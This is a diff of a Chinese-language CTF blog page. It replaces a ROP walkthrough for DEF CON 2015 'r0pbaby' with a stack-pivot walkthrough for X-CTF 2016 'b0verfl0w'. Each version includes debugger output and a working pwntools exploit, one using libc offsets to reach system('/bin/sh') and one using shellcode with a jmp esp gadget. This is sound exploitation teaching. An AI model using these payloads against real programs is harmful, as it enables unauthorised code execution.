@@ -79,35 +79,25 @@
 
 
 
-<meta name="description" content="学习一波经典的ROP题目。 题目地址：https://github.com/ctfs/write-ups-2015/tree/master/defcon-qualifier-ctf-2015/babys-first/r0pbaby">
+<meta name="description" content="1.先看看一些基本信息  2.查看保护  3.IDA查看反汇编代码  可以看到vul()函数存在栈溢出漏洞，但是很明显我们可以利用的空间并不大，由上图注释，s到bp距离为20字节，而bp占4字节，所以能溢出的栈空间只有50-0x20-4=14字节。所以我们再进行ROP技术就变的困难许多。 不过我们可以用Stack pivot（劫持栈指针）的方法，下面简单介绍一下，内容摘自ctf-wiki。 是什么">
 <meta name="keywords" content="pwn">
 <meta property="og:type" content="article">
-<meta property="og:title" content="ROP_r0pbaby">
-<meta property="og:url" content="https://hc1024.github.io/2019/09/25/ROP-r0pbaby/index.html">
+<meta property="og:title" content="b0verfl0w_X-CTF Quals 2016">
+<meta property="og:url" content="https://hc1024.github.io/2019/10/16/b0verfl0w-X-CTF-Quals-2016/index.html">
 <meta property="og:site_name" content="HC1024">
-<meta property="og:description" content="学习一波经典的ROP题目。 题目地址：https://github.com/ctfs/write-ups-2015/tree/master/defcon-qualifier-ctf-2015/babys-first/r0pbaby">
+<meta property="og:description" content="1.先看看一些基本信息  2.查看保护  3.IDA查看反汇编代码  可以看到vul()函数存在栈溢出漏洞，但是很明显我们可以利用的空间并不大，由上图注释，s到bp距离为20字节，而bp占4字节，所以能溢出的栈空间只有50-0x20-4=14字节。所以我们再进行ROP技术就变的困难许多。 不过我们可以用Stack pivot（劫持栈指针）的方法，下面简单介绍一下，内容摘自ctf-wiki。 是什么">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:image" content="https://i.loli.net/2019/09/25/W7DT6KqYjOziJAX.png">
-<meta property="og:image" content="https://i.loli.net/2019/09/25/9EFqd42y5zAiNUe.jpg">
-<meta property="og:image" content="https://i.loli.net/2019/09/25/Y9TX5HQ6rAqeCWl.png">
-<meta property="og:image" content="https://i.loli.net/2019/09/25/XNL3GmTUg8Exqjf.png">
-<meta property="og:image" content="https://i.loli.net/2019/09/25/ipmGdBItCvqrW8P.png">
-<meta property="og:image" content="https://i.loli.net/2019/09/25/FbylUpD8Itwn6oM.png">
-<meta property="og:image" content="https://i.loli.net/2019/09/25/3dwnQf1E4e8ltgy.png">
-<meta property="og:image" content="https://i.loli.net/2019/09/25/Q6DPaOCAoLXgMnt.png">
-<meta property="og:image" content="https://i.loli.net/2019/09/25/XKISZ7tq3u1cW2j.png">
-<meta property="og:image" content="https://i.loli.net/2019/09/25/YOpX5HcTKh6tnau.png">
-<meta property="og:image" content="https://i.loli.net/2019/09/25/Amvo4REBFTVzp9S.png">
-<meta property="og:image" content="https://i.loli.net/2019/09/25/wQFjL2fOEMXCJTl.png">
-<meta property="og:image" content="https://i.loli.net/2019/09/25/VLRNJSbkdmz7u49.png">
-<meta property="og:image" content="https://i.loli.net/2019/09/25/6VRyaCZfKIhJ2wb.png">
-<meta property="og:image" content="https://i.loli.net/2019/09/25/JIp9NdfwLaWmo1X.png">
-<meta property="og:image" content="https://i.loli.net/2019/09/25/fQmon54hdUajYV3.png">
-<meta property="og:updated_time" content="2019-09-24T18:49:22.000Z">
+<meta property="og:image" content="https://i.loli.net/2019/10/16/JguFUIOkixjbspS.png">
+<meta property="og:image" content="https://i.loli.net/2019/10/16/ydTKs4cStGwpQ2u.png">
+<meta property="og:image" content="https://i.loli.net/2019/10/16/diAfusySkZ8XQbJ.png">
+<meta property="og:image" content="https://i.loli.net/2019/10/16/kwI1Yyvx48fnTD7.jpg">
+<meta property="og:image" content="https://i.loli.net/2019/10/16/zN6VkZUefGBjIOt.png">
+<meta property="og:image" content="https://i.loli.net/2019/10/16/GFbUjTdvkaJ6OE8.jpg">
+<meta property="og:updated_time" content="2019-10-16T14:24:27.692Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="ROP_r0pbaby">
-<meta name="twitter:description" content="学习一波经典的ROP题目。 题目地址：https://github.com/ctfs/write-ups-2015/tree/master/defcon-qualifier-ctf-2015/babys-first/r0pbaby">
-<meta name="twitter:image" content="https://i.loli.net/2019/09/25/W7DT6KqYjOziJAX.png">
+<meta name="twitter:title" content="b0verfl0w_X-CTF Quals 2016">
+<meta name="twitter:description" content="1.先看看一些基本信息  2.查看保护  3.IDA查看反汇编代码  可以看到vul()函数存在栈溢出漏洞，但是很明显我们可以利用的空间并不大，由上图注释，s到bp距离为20字节，而bp占4字节，所以能溢出的栈空间只有50-0x20-4=14字节。所以我们再进行ROP技术就变的困难许多。 不过我们可以用Stack pivot（劫持栈指针）的方法，下面简单介绍一下，内容摘自ctf-wiki。 是什么">
+<meta name="twitter:image" content="https://i.loli.net/2019/10/16/JguFUIOkixjbspS.png">
 
 
 
@@ -137,13 +127,13 @@
 
 
 
-  <link rel="canonical" href="https://hc1024.github.io/2019/09/25/ROP-r0pbaby/">
+  <link rel="canonical" href="https://hc1024.github.io/2019/10/16/b0verfl0w-X-CTF-Quals-2016/">
 
 
 
 
 
-  <title>ROP_r0pbaby | HC1024</title>
+  <title>b0verfl0w_X-CTF Quals 2016 | HC1024</title>
   
 
 
@@ -290,7 +280,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://hc1024.github.io/2019/09/25/ROP-r0pbaby/">
+    <link itemprop="mainEntityOfPage" href="https://hc1024.github.io/2019/10/16/b0verfl0w-X-CTF-Quals-2016/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="HC">
@@ -307,7 +297,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">ROP_r0pbaby</h1>
+          <h1 class="post-title" itemprop="name headline">b0verfl0w_X-CTF Quals 2016</h1>
         
 
         <div class="post-meta">
@@ -319,8 +309,8 @@
               
                 <span class="post-meta-item-text">Posted on</span>
               
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-09-25T01:20:11+08:00">
-                2019-09-25
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-10-16T22:04:00+08:00">
+                2019-10-16
               </time>
             
 
@@ -367,7 +357,7 @@
                   <span class="post-meta-item-text">Reading time &asymp;</span>
                 
                 <span title="Reading time">
-                  4
+                  5
                 </span>
               
             </div>
@@ -388,69 +378,44 @@
       
 
       
-        <p>学习一波经典的ROP题目。</p>
-<p>题目地址：<a href="https://github.com/ctfs/write-ups-2015/tree/master/defcon-qualifier-ctf-2015/babys-first/r0pbaby" target="_blank" rel="noopener">https://github.com/ctfs/write-ups-2015/tree/master/defcon-qualifier-ctf-2015/babys-first/r0pbaby</a></p>
-<a id="more"></a>
+        <p>1.先看看一些基本信息</p>
+<p><img src="https://i.loli.net/2019/10/16/JguFUIOkixjbspS.png" alt="sk_pt1.png"></p>
+<p>2.查看保护</p>
+<p><img src="https://i.loli.net/2019/10/16/ydTKs4cStGwpQ2u.png" alt="sk_pt2.png"></p>
+<p>3.IDA查看反汇编代码</p>
+<p><img src="https://i.loli.net/2019/10/16/diAfusySkZ8XQbJ.png" alt="sk_pt3.png"></p>
+<p>可以看到vul()函数存在栈溢出漏洞，但是很明显我们可以利用的空间并不大，由上图注释，s到bp距离为20字节，而bp占4字节，所以能溢出的栈空间只有50-0x20-4=14字节。所以我们再进行ROP技术就变的困难许多。</p>
+<p>不过我们可以用Stack pivot（劫持栈指针）的方法，下面简单介绍一下，内容摘自ctf-wiki。</p>
+<p><strong>是什么？</strong></p>
+<p>劫持栈指针（Stack pivot）就是改写rsp(esp)，使其指向其他位置。这样栈也就被劫持到攻击者控制的内存上去，然后在该位置做ROP。</p>
+<p><strong>为什么？</strong></p>
+<p>1.可以控制的栈溢出的字节比较少，难以构造较长的ROP链，无法直接利用溢出字节进行ROP</p>
+<p>2.开启了PIE保护，栈地址未知，并且无法泄露，但是利用某些技术（如ret2dl-resolve）时，必须知道栈地址，可以通过stack pivot将栈劫持到相应的区域</p>
+<p>3.其它漏洞难以利用，stack pivot 能够将一些非栈溢出的漏洞，变成栈溢出的漏洞，例如，将程序劫持到堆空间中。</p>
+<p><strong>利用条件：</strong></p>
+<p>如果在尝试了直接Rop发现比较难实现，并且程序中有可以利用进行读写的函数，就可以考虑stack pivot</p>
+<p>1.可以控制程序执行流</p>
+<p>2.存在地址已知，内容可控的Buffer<br>        (1) BSS，由于进程按页分配内存，分配给bss段的内存大小至少一个页(4k,0x1000)大小。然而一般bss段的内容用不了这么多的空间，并且bss段分配的内存页拥有读写权限</p>
+<p>​        (2) 堆，但是需要我们能够泄露堆地址</p>
+<p>3.可以控制sp指针，一般来说，控制栈指针会使用 ROP，常见的控制栈指针的 gadgets 一般是 pop rsp/esp</p>
+<p>再回到题目：</p>
+<p>由于可以控制的栈溢出的字节比较少，难以构造较长的ROP链，无法直接利用溢出字节进行ROP，但是满足Stack pivot的利用条件，所以本题可以用Stack pivot。</p>
+<p>注意到存在一个hint函数，反汇编查看一下;</p>
+<p><img src="https://i.loli.net/2019/10/16/kwI1Yyvx48fnTD7.jpg" alt="sk_pt4.jpg"></p>
+<p>这是一个很重要的提示，我们稍后会用到。</p>
+<p>接下来按照正常栈溢出的题目的套路来：</p>
+<p><strong>1.找填充值</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ pattern create 100 /tmp/input</span><br><span class="line">Writing pattern of 100 chars to filename &quot;/tmp/input&quot;</span><br><span class="line">gdb-peda$ r &lt; /tmp/input</span><br><span class="line">Starting program: /home/hc/study/pwn/stackoverflow/stack pivoting/b0verfl0w &lt; /tmp/input</span><br><span class="line"></span><br><span class="line">======================</span><br><span class="line"></span><br><span class="line">Welcome to X-CTF 2016!</span><br><span class="line"></span><br><span class="line">======================</span><br><span class="line">What&apos;s your name?</span><br><span class="line">Hello AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAb.</span><br><span class="line">Program received signal SIGSEGV, Segmentation fault.</span><br><span class="line"></span><br><span class="line">[----------------------------------registers-----------------------------------]</span><br><span class="line">EAX: 0x1 </span><br><span class="line">EBX: 0x0 </span><br><span class="line">ECX: 0xf7fb5890 --&gt; 0x0 </span><br><span class="line">EDX: 0x0 </span><br><span class="line">ESI: 0xf7fb4000 --&gt; 0x1d4d6c </span><br><span class="line">EDI: 0x0 </span><br><span class="line">EBP: 0x41412941 (&apos;A)AA&apos;)</span><br><span class="line">ESP: 0xffffce90 (&quot;AA0AAFAAb&quot;)</span><br><span class="line">EIP: 0x61414145 (&apos;EAAa&apos;)</span><br><span class="line">EFLAGS: 0x10246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)</span><br><span class="line">[-------------------------------------code-------------------------------------]</span><br><span class="line">Invalid $PC address: 0x61414145</span><br><span class="line">[------------------------------------stack-------------------------------------]</span><br><span class="line">0000| 0xffffce90 (&quot;AA0AAFAAb&quot;)</span><br><span class="line">0004| 0xffffce94 (&quot;AFAAb&quot;)</span><br><span class="line">0008| 0xffffce98 --&gt; 0x62 (&apos;b&apos;)</span><br><span class="line">0012| 0xffffce9c --&gt; 0xf7df7e81 (&lt;__libc_start_main+241&gt;:   add    esp,0x10)</span><br><span class="line">0016| 0xffffcea0 --&gt; 0x1 </span><br><span class="line">0020| 0xffffcea4 --&gt; 0xffffcf34 --&gt; 0xffffd123 (&quot;/home/hc/study/pwn/stackoverflow/stack pivoting/b0verfl0w&quot;)</span><br><span class="line">0024| 0xffffcea8 --&gt; 0xffffcf3c --&gt; 0xffffd15d (&quot;XDG_SEAT=seat0&quot;)</span><br><span class="line">0028| 0xffffceac --&gt; 0xffffcec4 --&gt; 0x0 </span><br><span class="line">[------------------------------------------------------------------------------]</span><br><span class="line">Legend: code, data, rodata, value</span><br><span class="line">Stopped reason: SIGSEGV</span><br><span class="line">0x61414145 in ?? ()</span><br><span class="line">gdb-peda$ pattern search</span><br><span class="line">Registers contain pattern buffer:</span><br><span class="line">EBP+0 found at offset: 32</span><br><span class="line">EIP+0 found at offset: 36</span><br><span class="line">Registers point to pattern buffer:</span><br><span class="line">[ESP] --&gt; offset 40 - size ~9</span><br><span class="line">Pattern buffer found at:</span><br><span class="line">0x0804b166 : offset    0 - size   49 ([heap])</span><br><span class="line">0x0804b570 : offset    0 - size  100 ([heap])</span><br><span class="line">0xffffce68 : offset    0 - size   49 ($sp + -0x28 [-10 dwords])</span><br><span class="line">References to pattern buffer found at:</span><br><span class="line">0xf7fb45cc : 0x0804b570 (/lib32/libc-2.27.so)</span><br><span class="line">0xf7fb45d0 : 0x0804b570 (/lib32/libc-2.27.so)</span><br><span class="line">0xf7fb45d4 : 0x0804b570 (/lib32/libc-2.27.so)</span><br><span class="line">0xf7fb45d8 : 0x0804b570 (/lib32/libc-2.27.so)</span><br><span class="line">0xf7fb45dc : 0x0804b570 (/lib32/libc-2.27.so)</span><br><span class="line">0xffffcd08 : 0x0804b570 ($sp + -0x188 [-98 dwords])</span><br><span class="line">0xffffc984 : 0xffffce68 ($sp + -0x50c [-323 dwords])</span><br><span class="line">0xffffcdac : 0xffffce68 ($sp + -0xe4 [-57 dwords])</span><br><span class="line">0xffffce54 : 0xffffce68 ($sp + -0x3c [-15 dwords])</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://i.loli.net/2019/09/25/W7DT6KqYjOziJAX.png" alt="1.png"></p>
-<p>64位的程序</p>
-<p>查看保护：</p>
-<p><img src="https://i.loli.net/2019/09/25/9EFqd42y5zAiNUe.jpg" alt="2.jpg"></p>
-<p>开启了NX（不可执行）+PIE（Position Independnet Code位置无关代码）等安全防护，对于这样的保护机制，绕过的方法是ROP(Return-oriented Programming)，那ROP是什么？</p>
-<p>ROP的核心思想：攻击者扫描已有的<a href="https://baike.baidu.com/item/动态链接库/100352" target="_blank" rel="noopener">动态链接库</a>和可执行文件，提取出可以利用的指令片段(gadget)，这些指令片段均以ret指令结尾，即用ret指令实现指令片段执行流的衔接。</p>
-<p>（往后做的时候遇到一个问题，看别的大佬的wp，有说要关闭ASLR的，把关不关ASLR分成了两种解法，我自己本地试的时候，发现我关了ASLR也没用，exp根本跑不起来，所以我就按有ASLR的解法来了。）</p>
-<p>玩一玩这个程序：</p>
-<p><img src="https://i.loli.net/2019/09/25/Y9TX5HQ6rAqeCWl.png" alt="3.png"></p>
-<p>第一选项打印libc地址</p>
-<p>第二个选项打印system函数地址</p>
-<p>第三个是向栈写数据</p>
-<p>用ida看一下</p>
-<p><img src="https://i.loli.net/2019/09/25/XNL3GmTUg8Exqjf.png" alt="4.png"></p>
-<p><img src="https://i.loli.net/2019/09/25/ipmGdBItCvqrW8P.png" alt="5.png"></p>
-<p>发现危险函数memcpy()，说明存在栈溢出漏洞。</p>
-<p>接下来用gdb调试一下：</p>
-<p><img src="https://i.loli.net/2019/09/25/FbylUpD8Itwn6oM.png" alt="6.png"></p>
-<p><img src="https://i.loli.net/2019/09/25/3dwnQf1E4e8ltgy.png" alt="7.png"></p>
-<p><img src="https://i.loli.net/2019/09/25/Q6DPaOCAoLXgMnt.png" alt="8.png"></p>
-<p>看到程序在0x0000555555554eb3崩溃</p>
-<p><img src="https://i.loli.net/2019/09/25/XKISZ7tq3u1cW2j.png" alt="9.png"></p>
-<p>此时rsp中的值是ABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbA，来计算一下偏移量:</p>
-<p><img src="https://i.loli.net/2019/09/25/YOpX5HcTKh6tnau.png" alt="10.png"></p>
-<p>所以，ret的地址是以我们输入的偏移量为8的位置来取的。我们这样就可以控制rip了。</p>
-<p>现在来想一下我们该干什么。我们的希望获取一个shell，也就是说要控制程序执行流程，最好能跳转执行system函数。</p>
-<p>所以我们需要构造一个payload让程序执行system(“/bin/sh”)</p>
-<p>接下来我们要做的：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">找到&quot;/bin/sh&quot;位置</span><br><span class="line">找到&quot;system函数地址&quot;</span><br><span class="line">寻找合适的gadget，让程序流连接起来</span><br></pre></td></tr></table></figure>
+<p>填充值为36。所以我们需要填充36字节的垃圾值然后跟上要返回的地址(4字节)</p>
+<p>我们的payload可以构造如下：</p>
+<p><img src="https://i.loli.net/2019/10/16/zN6VkZUefGBjIOt.png" alt="sk_pt5.png"></p>
+<p>0x08048504为jmp esp 的gadgets（看前面提到的hint），覆盖了返回地址，当程序执行到ret时，将该地址pop给eip，并且esp会加4指向asm(sub esp,0x28;jmp esp),然后eip执行地址0x08048504上的代码jmp esp，eip又会执行esp指向的sub esp,0x28;jmp esp，完成esp的劫持。正常情况下eip指向的是.text段中的代码，所以需要将sub esp,0x28;jmp esp转化为机器码，这里是十六进制机器码。</p>
+<p>至于为什么是sub 0x28，36byte+4byte=40byte=0x28byte。</p>
+<p><strong>2.编写exp</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">p = process(&apos;./b0verfl0w&apos;)</span><br><span class="line"></span><br><span class="line">jmp_esp = 0x08048504</span><br><span class="line">shellcode = &quot;\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80&quot;</span><br><span class="line">payload = shellcode + &apos;A&apos; * (36 - len(shellcode)) + p32(jmp_esp) + asm(&apos;sub esp, 0x28;jmp esp&apos;)</span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 
-<p><strong>寻找gadget</strong>：</p>
-<p>我们要跳转执行的地方，要有两个pop和一个call。先来复习一下64位架构下各寄存器的作用：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">%rax 作为函数返回值使用。</span><br><span class="line">%rsp 栈指针寄存器，指向栈顶</span><br><span class="line">%rdi，%rsi，%rdx，%rcx，%r8，%r9 用作函数参数，依次对应第1参数，第2参数。。。</span><br><span class="line">%rbx，%rbp，%r12，%r13，%14，%15 用作数据存储，遵循被调用者使用规则，简单说就是随便用，调用子函数之前要备份它，以防他被修改</span><br><span class="line">%r10，%r11 用作数据存储，遵循调用者使用规则，简单说就是使用之前要先保存原值</span><br></pre></td></tr></table></figure>
-
-<p>rdi是传第一个参数的，那么我们要寻找的gadget至少有一个pop  rdi，我们可以用ida在libc中来找：</p>
-<p>我们使用的libc是：libc-2.27.so</p>
-<p><img src="https://i.loli.net/2019/09/25/Amvo4REBFTVzp9S.png" alt="11.png"></p>
-<p><img src="https://i.loli.net/2019/09/25/wQFjL2fOEMXCJTl.png" alt="12.png"></p>
-<p>找到了符合的。</p>
-<p><strong>寻找”/bin/sh”:</strong></p>
-<p>用ida ：</p>
-<p>用ida打开libc-2.27.so，shift + f12 ,ctrl + f 搜索”/bin/sh’</p>
-<p><img src="https://i.loli.net/2019/09/25/VLRNJSbkdmz7u49.png" alt="13.png"></p>
-<p>或：</p>
-<p><img src="https://i.loli.net/2019/09/25/6VRyaCZfKIhJ2wb.png" alt="14.png"></p>
-<p>区别在于ida找到的是程序未加载到内存时的地址，第二种方法找到的是在内存中的地址。如果开启了ASLR，还是用ida吧。</p>
-<p><strong>寻找system：</strong></p>
-<p>ida打开libc-2.27.so，搜索字符串”system”</p>
-<p><img src="https://i.loli.net/2019/09/25/JIp9NdfwLaWmo1X.png" alt="15.png"></p>
-<p><strong>构造payload：</strong></p>
-<p>“A”*8 + p64(ppc) + p64(sys_addr) + p64(binsh_addr) </p>
-<p>关于这个顺序，我的理解是，因为我们找到的gadget的是先pop rax，再pop rdi，也就是说，当程序跳转到这一块时，先要执行pop rax，又因为rax用来传递函数地址，而且后面还要call rax，那接下来跟的就只能是system函数的地址，pop rdi，就把”/bin/sh”用rdi传过去。</p>
-<p>好了，到这里我们粗略的完成了payload的构造，接下来要考虑的具体一点。</p>
-<p>我们默认是开启了ASLR保护的，程序运行后，我们上面找到的地址就发生变化了，那么程序运行我们如何定位我们需要的地址呢？</p>
-<p>我们知道在程序未加载到内存中时，system在libc中的地址，我们也知道ppc和binsh在libc中的地址，那么就通过计算它们相对于libc_system的偏移，加载到内存中后就可以表示成system运行后的地址+偏移了。而system函数运行后的地址可以通过程序第二个选项来获得。</p>
-<p><strong>编写exp:</strong></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">sh = process(&apos;./r0pbaby&apos;)</span><br><span class="line">def get_system_addr():</span><br><span class="line">    sh.recvuntil(&apos;: &apos;)</span><br><span class="line">    sh.sendline(&apos;2&apos;)</span><br><span class="line">    sh.recv()</span><br><span class="line">    sh.sendline(&apos;system&apos;)</span><br><span class="line">    addr = sh.recvline().split(&apos;0x&apos;)[1].split(&apos;\n&apos;)[0]</span><br><span class="line">    return addr</span><br><span class="line">    </span><br><span class="line">def send_paylaod(sys_addr,binsh_off,ppc_off):</span><br><span class="line">    payload = &apos;A&apos; * 8 + p64(sys_addr + ppc_off) + p64(sys_addr) + p64(sys_addr + binsh_off)</span><br><span class="line">    sh.recv()</span><br><span class="line">    sh.sendline(&apos;3&apos;)</span><br><span class="line">    sh.recv()</span><br><span class="line">    sh.sendline(str(len(payload)))</span><br><span class="line">    sh.sendline(payload)</span><br><span class="line">    return</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    sys_addr = int(get_system_addr(),16)</span><br><span class="line">    #print sys_addr</span><br><span class="line">    libc_sys_addr = 0x4F440</span><br><span class="line">    libc_binsh_addr = 0x1B3E9A</span><br><span class="line">    libc_ppc_addr = 0x12188B</span><br><span class="line">    binsh_off = libc_binsh_addr - libc_sys_addr</span><br><span class="line">    ppc_off = libc_ppc_addr - libc_sys_addr</span><br><span class="line">    send_paylaod(sys_addr,binsh_off,ppc_off)</span><br><span class="line">    sh.recv()</span><br><span class="line">    sh.interactive()</span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://i.loli.net/2019/09/25/fQmon54hdUajYV3.png" alt="16.png"></p>
+<p><img src="https://i.loli.net/2019/10/16/GFbUjTdvkaJ6OE8.jpg" alt="sk_pt6.jpg"></p>
 
       
     </div>
@@ -481,8 +446,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2019/09/12/hello-world/" rel="next" title="hello world">
-                <i class="fa fa-chevron-left"></i> hello world
+              <a href="/2019/09/25/ROP-r0pbaby/" rel="next" title="ROP_r0pbaby">
+                <i class="fa fa-chevron-left"></i> ROP_r0pbaby
               </a>
             
           </div>
@@ -490,10 +455,6 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2019/10/16/b0verfl0w-X-CTF-Quals-2016/" rel="prev" title="b0verfl0w_X-CTF Quals 2016">
-                b0verfl0w_X-CTF Quals 2016 <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
